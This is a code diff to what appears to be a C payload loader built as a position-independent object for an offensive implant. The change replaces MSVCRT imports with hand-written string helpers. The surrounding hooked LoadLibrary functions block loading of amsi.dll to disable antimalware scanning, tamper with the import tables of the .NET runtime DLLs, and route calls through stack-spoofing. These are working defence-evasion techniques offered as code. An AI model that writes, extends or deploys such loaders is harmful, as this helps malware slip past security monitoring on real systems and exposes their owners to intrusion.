@@ -15,8 +15,34 @@ DECLSPEC_IMPORT BOOL WINAPI KERNEL32$VirtualProtect(LPVOID, SIZE_T, DWORD,
 DECLSPEC_IMPORT BOOL WINAPI KERNEL32$VirtualFree(LPVOID, SIZE_T, DWORD);
 DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$LoadLibraryW(LPCWSTR);
 DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$LoadLibraryExW(LPCWSTR, HANDLE, DWORD);
-DECLSPEC_IMPORT int WINAPI MSVCRT$_wcsicmp(const wchar_t *, const wchar_t *);
-DECLSPEC_IMPORT wchar_t *WINAPI MSVCRT$wcsrchr(const wchar_t *, wchar_t);
+/* The payload loader runs before any CRT is guaranteed to be loaded. Keep the
+ * two wide-string helpers local so the PICO never imports MSVCRT. */
+static wchar_t *wcs_rchr(const wchar_t *s, wchar_t c) {
+  const wchar_t *last = NULL;
+  for (; *s; s++) {
+    if (*s == c) {
+      last = s;
+    }
+  }
+  return (wchar_t *)last;
+}
+
+static wchar_t wcs_lower(wchar_t c) {
+  return (c >= L'A' && c <= L'Z') ? (wchar_t)(c + (L'a' - L'A')) : c;
+}
+
+static int wcs_icmp(const wchar_t *a, const wchar_t *b) {
+  while (*a && *b) {
+    wchar_t ca = wcs_lower(*a);
+    wchar_t cb = wcs_lower(*b);
+    if (ca != cb) {
+      return (int)ca - (int)cb;
+    }
+    a++;
+    b++;
+  }
+  return (int)wcs_lower(*a) - (int)wcs_lower(*b);
+}
 
 HMODULE WINAPI _LoadLibraryA(LPCSTR lpLibFileName) {
   FUNCTION_CALL call = {0};
@@ -32,8 +58,8 @@ HMODULE WINAPI _LoadLibraryA(LPCSTR lpLibFileName) {
 HMODULE WINAPI _LoadLibraryExW(LPCWSTR lpLibFileName, HANDLE hFile,
                                DWORD dwFlags) {
   /* get the filename from path */
-  LPCWSTR back = MSVCRT$wcsrchr(lpLibFileName, L'\\');
-  LPCWSTR fwd = MSVCRT$wcsrchr(lpLibFileName, L'/');
+  LPCWSTR back = wcs_rchr(lpLibFileName, L'\\');
+  LPCWSTR fwd = wcs_rchr(lpLibFileName, L'/');
   LPCWSTR name = back > fwd ? back : fwd;
 
   if (name) {
@@ -43,7 +69,7 @@ HMODULE WINAPI _LoadLibraryExW(LPCWSTR lpLibFileName, HANDLE hFile,
   }
 
   /* say no to amsi */
-  if (MSVCRT$_wcsicmp(name, L"amsi.dll") == 0) {
+  if (wcs_icmp(name, L"amsi.dll") == 0) {
     /* return without loading (─ ‿ ─) */
     return NULL;
   }
@@ -62,8 +88,7 @@ HMODULE WINAPI _LoadLibraryExW(LPCWSTR lpLibFileName, HANDLE hFile,
   HMODULE module = (HMODULE)spoof_call(&call);
 
   /* check to see if it's mscoreei.dll or clr.dll */
-  if (MSVCRT$_wcsicmp(name, L"mscoreei.dll") == 0 ||
-      MSVCRT$_wcsicmp(name, L"clr.dll") == 0) {
+  if (wcs_icmp(name, L"mscoreei.dll") == 0 || wcs_icmp(name, L"clr.dll") == 0) {
     IMAGE_DOS_HEADER *dos_headers;
     IMAGE_NT_HEADERS *nt_headers;
     IMAGE_DATA_DIRECTORY imports_directory;
@@ -154,7 +179,7 @@ HMODULE WINAPI _LoadLibraryW(LPCWSTR lpLibFileName) {
   HMODULE module = (HMODULE)spoof_call(&call);
 
   /* was this mscoree.dll? */
-  if (MSVCRT$_wcsicmp(lpLibFileName, L"mscoree.dll") == 0) {
+  if (wcs_icmp(lpLibFileName, L"mscoree.dll") == 0) {
     IMAGE_DOS_HEADER *dos_header;
     IMAGE_NT_HEADERS *nt_headers;
     IMAGE_DATA_DIRECTORY imports_directory;
